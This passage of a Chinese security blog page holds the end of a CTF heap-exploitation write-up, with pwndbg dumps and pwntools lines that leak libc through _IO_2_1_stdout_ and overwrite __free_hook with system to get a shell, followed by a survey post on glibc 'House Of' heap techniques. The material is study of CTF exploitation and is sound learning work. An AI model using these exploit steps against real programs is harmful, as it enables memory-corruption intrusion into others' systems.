<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd0e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">2</span>]: <span class="number">0x558b1cfcd0b0</span> ◂— <span class="number">0x7fef51cc13cd</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x558b1cfcd060</span> ◂— <span class="number">0x1f1</span> <span class="comment">// delete(后面有大用处)</span></span><br><span class="line"><span class="number">0x60</span> [  <span class="number">1</span>]: <span class="number">0x7fea097ddc00</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x558ce25c44cd</span></span><br><span class="line"><span class="number">0x70</span> [  <span class="number">0</span>]: <span class="number">0x7fea097ddc00</span> (main_arena+<span class="number">96</span>) ◂— ...</span><br><span class="line"><span class="number">0x80</span> [  <span class="number">0</span>]: <span class="number">0x558b1cfcd</span></span><br><span class="line"><span class="number">0x260</span> [ <span class="number">81</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2a0</span> [<span class="number">52796</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2b0</span> [<span class="number">22705</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2c0</span> [  <span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2e0</span> [<span class="number">53264</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2f0</span> [<span class="number">7420</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x300</span> [<span class="number">21899</span>]: <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x558b1cfcd0a0</span> —▸ <span class="number">0x7fea097ddc00</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x558b1cfcd0a0</span></span><br></pre></td></tr></table></figure>
<p>这一块需要先学习 tcache_perthread_struct 结构</p>
<p>下面一段代码需要把两个“add”分开进行理解：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, p16(<span class="built_in">stdout</span>))</span><br><span class="line">add(<span class="number">0x58</span>, p64(<span class="number">0xfdad2887</span> | <span class="number">0x1000</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + b<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x84</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.format(hex(libc.address)))</span><br></pre></td></tr></table></figure>
<p>第一次申请后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x7f465c72d9cf</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x55aa705cf060</span> ◂— <span class="number">0x1f1</span></span><br><span class="line"><span class="number">0x60</span> [  <span class="number">1</span>]: <span class="number">0x7f4306d5a6c0</span> (_nl_C_LC_CTYPE+<span class="number">64</span>) ◂— <span class="number">0x7f44f2e09f9a</span> </span><br><span class="line">    <span class="comment">// 这里将有1/16的概率为 _IO_2_1_stdout_</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55aa705cf000</span></span><br><span class="line"><span class="number">0x55aa705cf000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x55aa705cf010</span>:	<span class="number">0x0001000100000000</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55aa705cf020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x55aa705cf060</span>:	<span class="number">0x000000055aa7043e</span>	<span class="number">0x000055aa705cf010</span></span><br><span class="line"><span class="number">0x55aa705cf070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55aa705cf0a0</span>:	<span class="number">0x00007f465c72d9cf</span>	<span class="number">0x000055aa705cf060</span> <span class="comment">// &#x27;0x40&#x27;的tcache</span></span><br><span class="line"><span class="number">0x55aa705cf0b0</span>:	<span class="number">0x00007f4306d5a6c0</span>	<span class="number">0x0000000000000000</span> <span class="comment">// &#x27;0x60&#x27;的tcache(已覆盖)</span></span><br><span class="line"><span class="number">0x55aa705cf0c0</span>:	<span class="number">0x000000055aa705cf</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>这次申请的是“0x40的tcache”（写有“0x60的tcache”），输入的是“0x60的tcache”的位置，下一次如果申请的大小为“0x60”就会把“覆盖后的main_arena”申请出来，进行一次写入</p>
<p>第二次申请，就进行了 IO_2_1_stdout leak，通过修改 <code>_IO_2_1_stdout_</code> 的 flag 值，然后当程序调用 puts 输出任意信息时，就会输出 <code>_IO_write_base</code> 到 <code>_IO_write_ptr</code> 之间的数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x48</span>, b<span class="string">&quot;\x00&quot;</span>*<span class="number">0x40</span> + p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x38</span>, b<span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x10</span>) + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="keyword">delete</span>()</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x7f3e3391980a</span> <span class="comment">// 可以继续覆盖为&quot;free_hook&quot;</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x561aa040a060</span> ◂— <span class="number">0x1f1</span></span><br><span class="line"><span class="number">0x60</span> [  <span class="number">0</span>]: <span class="number">0x708180b3d</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x561aa040a050</span></span><br><span class="line"><span class="number">0x561aa040a050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x561aa040a060</span>:	<span class="number">0x0000000561aa05fb</span>	<span class="number">0x0000561aa040a010</span> <span class="comment">// will be malloc</span></span><br><span class="line"><span class="number">0x561aa040a070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561aa040a080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561aa040a090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x561aa040a0a0</span>:	<span class="number">0x00007f3e3391980a</span>	<span class="number">0x0000561aa040a060</span> <span class="comment">// &#x27;0x40&#x27;的tcache</span></span><br><span class="line"><span class="number">0x561aa040a0b0</span>:	<span class="number">0x0000000708180b3d</span>	<span class="number">0x0000000000000000</span> <span class="comment">// &#x27;0x60&#x27;的tcache</span></span><br><span class="line"><span class="number">0x561aa040a0c0</span>:	<span class="number">0x0000000561aa040a</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>和上面思路一样，打了 free_hook 就结束了（这个heap排列真的值得我学习）</p>
<hr>
<p><strong>小结：</strong></p>
<p>本题目融合了 tcache perthread corruption，house of roman，IO_2_1_stdout leak，难度有明显上升，因为我之前复现了一道 house of roman 和 IO_2_1_stdout leak 结合的题目，所以爆破这部分比较顺畅</p>
<p>此题目大大加强了我对 tcache 的理解（主要是对“tcache_perthread_struct”的理解），还体验了一波 tcache perthread corruption（刚学tcache时，觉得它的检查很少很简单，现在觉得它的利用也挺麻烦的）</p>
<p>我还学习到了大佬的思路，说实话，大佬对于覆写“tcache_entry”的处理真的让我大开眼界，他对于 unsortedbin 的切割很是讲究，使 main_arena 刚好可以被控制，并且后面“申请tcache”和“覆写main_arena”的配合也是研究过的，没有出现“无main_arena可用”的尴尬（对于 heap 排列，我还是要多多“试错”）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/13/House%20Of%20%E7%B3%BB%E5%88%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/13/House%20Of%20%E7%B3%BB%E5%88%97/" class="post-title-link" itemprop="url">House Of 系列（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-03-13 15:35:22 / Modified: 15:40:26" itemprop="dateCreated datePublished" datetime="2022-03-13T15:35:22+08:00">2022-03-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p>House Of Spirit 是一种 fastbin attack ，通过利用 free 函数来释放一个 fake chunk，将地址 free 到堆的 bin 链中，然后实现对栈地址的读写实现WAA</p>
<p><strong>保护检查</strong></p>
<ul>
<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理</li>
<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐</li>
<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code></li>
<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况</li>
</ul>
<p>主要是：当前chunk的size（chunk-&gt;size），和下一个chunk的size（nextchunk-&gt;size）</p>
<p><strong>利用条件</strong></p>
<ul>
<li>可以控制 free 的参数，把它改为 fake chunk data addr（House Of Spirit的核心）</li>
<li>可以控制 fake chunk 的 size</li>
<li>可以控制 next chunk 的 size（程序会根据 fake chunk-&gt;size 来获取 next chunk 的位置）</li>
</ul>
<p><strong>利用姿势</strong></p>
<p>现成了两种风格：</p>
<ul>
<li>释放栈中的 fake chunk，劫持 ret 返回地址（利用栈溢出覆盖free的参数）</li>
<li>释放堆中的 fake chunk，劫持控制模块实现WAA（需要注意chunk结构和off-by-one）</li>
</ul>
<p>小技巧：</p>
<ul>
<li>一定要多多关注“可控区域”里的“数字”</li>
<li>注意一些“计数器”</li>
</ul>
<p>用这些现成的“数字”充当 nextchunk-&gt;size 或者 chunk-&gt;size</p>
<p><strong>版本影响</strong></p>
<p>libc-2.23：基础检查</p>
<p>libc-2.27：多了一个检查，nextchunk-&gt;presize 不为 0（注意 tcache 的影响）</p>
<hr>
<h2 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h2><p>house of force 是修改 top chunk size 的一种利用方法 ，利用 top chunk 分割中的漏洞来申请任意 chunk，再通过修改模块进行 GOT劫持，hook劫持</p>
<p>假设这个时候的 top_chunk=0x601200，然后 malloc(0xffe00020)，然后对 malloc 申请的 size 进行检查，<code>0xffe00030 &lt; top_chunk_size</code> ，所以可以成功malloc内存，然后计算top_chunk的新地址：<code>0xffe00030+0x601200=0x100401230</code>, 因为是x86环境，最高位溢出了，所以<code>top_chunk=0x401230</code></p>
<p>然后下次我们再malloc的时候，返回的地址就是<code>0x401238</code></p>
<p><strong>保护检查</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)) </span><br></pre></td></tr></table></figure>
<p>只有 top chunk 的 size 大于等于申请的 size，才会有后续操作</p>
<p><strong>利用条件</strong></p>
<ul>
<li>用户能够篡改 top chunk 的 size 字段（篡改为负数或很大值）</li>
<li>用户可以申请任意大小的堆内存（包括负数）</li>
<li>堆溢出，用于修改 top chunk-&gt;size</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>通过堆溢出将 top chunk 的 size 字段篡改成 -1（size 就变成了无符号整数中最大的值）</li>
<li>计算偏移，申请大小为该偏移的chunk，把 top chunk 分割到可以修改的目标地址</li>
</ul>
<p>以下公式可以用来计算偏移：（有时 offse 有偏差也可以进行修正）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">offset = target_addr - (top_chunk_addr + <span class="number">0x8</span>) <span class="comment"># 64位就改为&quot;+0x10&quot;</span></span><br><span class="line"><span class="comment"># target_addr：目标地址</span></span><br><span class="line"><span class="comment"># top_chunk_addr：top chunk起始地址</span></span><br></pre></td></tr></table></figure>
<p>注意：offset 通常为负</p>
<p><strong>版本影响</strong></p>
<p>libc-2.23：基础检查，可以通过</p>
<p>libc-2.27：在检查中给chunk添加了一个“范围”（min_address &amp; max_address），限制了申请chunk的地址范围，这样就导致 top chunk 无法分割到目标地址了，House Of Force 失效</p>
<hr>
<h2 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h2><p>house of einherjar 跟 house of force 差不多，最终目的都是控制 top chunk 的值，该技术可以强制使得<code>malloc</code>返回一个几乎任意地址的 chunk</p>
<p>通过 off-by-one 把最后一个 chunk 的 pre_inuse 标志位置零，让 free 函数以为上一个 chunk 已经被 free，就会进行后向合并，根据 last chunk-&gt;fake presize 把 top chunk 合并到目标区域</p>
<p>然后下次我们再malloc的时候，返回的地址就是目标地址</p>
<p><strong>保护检查</strong></p>
<p>Unlink 的检测：检查 <strong>“fake chunk-&gt;size”</strong> （必须可以通过 size 索引到“last chunk”，并且P位为“0”，这样才会进行 unlink），因为“fake_size”（offset）很大，fake chunk 会被当做是 large chunk ，所以还会格外检查 <strong>FD，BK，FDsize，BKsize</strong> </p>
<p><strong>利用条件</strong></p>
<ul>
<li>用户能够篡改 top chunk 的 presize 字段（篡改为负数或很大值）</li>
<li>有 off-by-one ，可以覆盖 last chunk 的P位为“\x00”（使其在和 top chunk 合并后还可以进行后向合并，通过“chunk-&gt;presize”索引到“fake chunk”把 top chunk 合并到“fake chunk”上）</li>
<li>可以控制“fake chunk”</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>已有两个 chunk（最后一个chunk，和倒数第二个chunk）</li>
<li>在倒数第二个 chunk 的最后一片内存空间（lastchunk-&gt;presize）中写入 offset（可以索引到 fakechunk），同时溢出“\x00”覆盖 lastchunk 的P位（lastchunk-&gt;size）</li>
<li>提前在 fake chunk 处伪造好数据：presize（offset），size，FD，BK，FDsize，BKsize</li>
<li>释放 lastchunk，这样 top chunk 就会转移到该地址</li>
</ul>
<p>以下公式可以用来计算偏移 presize：（有时 offse 有偏差也可以进行修正）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">offset = lastchunk_addr - target_addr</span><br><span class="line"><span class="comment"># target_addr：目标地址</span></span><br><span class="line"><span class="comment"># lastchunk_addr：last chunk起始地址</span></span><br></pre></td></tr></table></figure>
<p>小技巧：</p>
<ul>
<li>控制“fake chunk”，写入“fake_size”，在“FD，BK，FDsize，BKsize”中都写入“fake chunk addr”（target_addr）就可以通过检查（至少在 libc-2.23 是这样的）</li>
</ul>
<p><strong>版本影响</strong></p>
<p>libc-2.23：基本没有影响，可以通过</p>
<p>libc-2.27：Unlink 对 presize 的检查更为严格了，导致 House Of Einherjar 失效</p>
<hr>
<h2 id="House-Of-Lore"><a href="#House-Of-Lore" class="headerlink" title="House Of Lore"></a>House Of Lore</h2><p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关</p>
<p>它的利用面很小，很容易被其他攻击技术取代</p>
<ul>
<li>House of Lore 可以实现 <strong>分配</strong> 任意指定位置的 chunk，从而修改任意地址的内存</li>
<li>House of Lore 利用的前提是需要控制 Small Bin Chunk 的bk指针，并且控制指定位置 chunk 的fd指针</li>
</ul>
<p><strong>保护检查</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br></pre></td></tr></table></figure>
<p>检查 fakechunk-&gt;FD 是不是 victim_chunk</p>
<p><strong>利用条件</strong></p>
<ul>
<li>可以构造 small bins（一般程序会用 fastbin，unsortedbin，tcache 很少用smallbin，largebin）</li>
<li>程序可修改 small bins 中 free chunk 的 bk 指针</li>
<li>对应伪造 fake chunk 的区域有一定控制权（可以伪造 fakechunk-&gt;FD 为 victim_chunk）</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>首先申请了一个在 fastbin 范围内的 victim chunk，然后再在栈上构造了一个 fake chunk（fake chunk 为 stack_buffer_1，还需要一个 stack_buffer_2 来打掩护）</li>
<li>为了绕过检测，设置 stack_buffer_1 的 BK 指针指向 stack_buffer_2，设置 stack_buffer_2 的 FD 指针指向 stack_buffer_1</li>
<li>接下来先 malloc 一个chunk，防止 free 之后与 top chunk 合并，然后 free 掉 victim，这时候 victim 会被放到 fastbin 中  </li>
<li>接下来再去 malloc 一个 large chunk，会触发 fastbin 的合并，然后放到 unsorted bin 中，这样我们的 victim chunk 就放到了 unsorted bin 中，然后最终被 unsorted bin 分配到 small bin 中</li>
<li>在 victim chunk 的BK指针中写入fake chunk（small bin是基于BK，从后向前申请的）</li>
<li>再次申请 victim chunk（同时 fake chunk 进入small bin），最后申请 fake chunk </li>
</ul>
<p><strong>版本影响</strong></p>
<p>libc-2.23：基础检查，可以通过</p>
<p>libc-2.27：基础检查，还需要绕过 cache</p>
<p>libc-2.31：House Of Lore 已经失效</p>
<hr>
<h2 id="House-Of-Orange"><a href="#House-Of-Orange" class="headerlink" title="House Of Orange"></a>House Of Orange</h2><p>House Of Orange 核心就是通过漏洞利用获得 free 的效果 </p>
<p>这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins</p>
<p>后续可以配合 unsorted bin attack 和 FSOP 获取 shell</p>
<p><strong>利用条件</strong></p>
<ul>
<li>有堆溢出，可以修改 top chunk size</li>
<li>可以申请较大的空间</li>
<li>没有释放模块（看见程序没有 free，realloc等函数时，优先考虑打House Of Orange）</li>
</ul>
<p>伪造的 top chunk size 的要求 ：</p>
<ul>
<li>0x0fe1、0x1fe1、0x2fe1、0x3fe</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>通过堆溢出修改 top chunk size为“0x0fe1”</li>
<li>申请“0x2000”的空间</li>
</ul>
<p><strong>版本影响</strong></p>
<p>libc-2.23：可用打通</p>
<p>libc-2.24：增加了 vtable check，但仍然可以绕过</p>
<p>libc-2.27：完全失效</p>
<hr>
<h2 id="House-Of-Rabbit"><a href="#House-Of-Rabbit" class="headerlink" title="House Of Rabbit"></a>House Of Rabbit</h2><p>House Of Rabbit 是一种伪造堆块的技术，一般运用在 fastbin attack 中</p>
<ul>
<li>缺点：条件过多并且有替代选项（unlink攻击，Double free等等）</li>
<li>优点：对 libc 版本的“抵抗力”很强，高 libc 版本也可以打</li>
</ul>
<p>核心：利用 fastbin consolidate 使 fastbin 中的 fake chunk 合法化</p>
<p><strong>利用条件</strong></p>
<ul>
<li>修改fastbin chunk的大小（感觉和unlink条件差不多，效果也差不多）<ul>
<li>堆溢出（有时off-by-one也利用），可以覆盖 nextchunk-&gt;size</li>
<li>可以申请足够大小的 chunk</li>
<li>可以控制 free 的参数</li>
</ul>
</li>
<li>修改FD指针（这种情况不用考虑，因为可以打 Double free，除非特殊情况）<ul>
<li>有修改模块，并且有UAF（可以修改 free chunk）</li>
<li>可以申请足够大小的 chunk</li>
<li>可以控制 free 的参数</li>
</ul>
</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>修改fastbin chunk的大小：直接构造 overlap chunk，通过 fastbin consolidate 使其合法化</li>
<li>修改FD指针：让 chunk-&gt;FD 指向一个 fake chunk，触发 fastbin consolidate 之后让这个 fake chunk 成为一个合法的 chunk（注意一下fake chunk的排列，不然会在consolidate时报错）</li>
</ul>
<p><strong>版本影响</strong></p>
<p>经测试：libc-2.23 ~ libc-2.31 都可以打通</p>
<hr>
<h2 id="House-Of-Roman"><a href="#House-Of-Roman" class="headerlink" title="House Of Roman"></a>House Of Roman</h2><p>House of Roman 的一个核心思路就是利用 <strong>局部写</strong> 减少随机化的程度，从而给出爆破的可能</p>
<p>这种利用手法的主要特点是不需要 <code>leak libc</code>的地址，用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的，且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下，就能完成利用（当然也可以来绕 PIE）</p>
<p>当程序没法泄露 libc_base 时，就会优先考虑 House Of Roman</p>
<p><strong>利用条件</strong></p>
<ul>
<li>UAF（对 fastbin 中的“main_arena+xx”进行修改，使其指向目标地址）</li>
<li>off-by-one（覆写“size”的大小，为了使保留有“main_arena+xx”进入fastbin）</li>
</ul>
<p><strong>利用姿势</strong></p>
<ul>
<li>利用 off-by-one 把原本不可能进入 fastbin 的 unsorted chunk 进行修改（修改 size 到 fastbin 的范围），使遗留有“main_arena+xx”的chunk进入 fastbin</li>
<li>利用 UAF 修改遗留在 fast chunk 中的“main_arena+xx”，使其指向目标地址</li>
</ul>
<p><strong>版本影响</strong></p>
<p>House Of Roman 并不依赖于 libc 源码，它的思想完全可以独立使用（覆盖main_arena）</p>
<p>但是实现 House Of Roman 需要 fastbin attack，unsortedbin attack 等技术的配合，而它们会受 libc 版本影响：</p>
<p>libc-2.27：</p>
<ul>
<li>fastbin attack 需要绕 tache（对chunk的数量有要求）</li>
<li>unsortedbin attack 可以直接打（只检查了“victim-&gt;size”，形同虚设）</li>
</ul>
<p>libc-2.29：</p>
<ul>
<li>fastbin attack 需要绕 tache（对chunk的数量有要求）</li>
<li>unsortedbin attack 失效（其实也有办法可以绕过，只是条件苛刻）</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/18/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><span class="page-number current">19</span><a class="page-number" href="/page/20/">20</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><a class="extend next" rel="next" href="/page/20/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">238</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">138</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">3.2m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">48:09</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
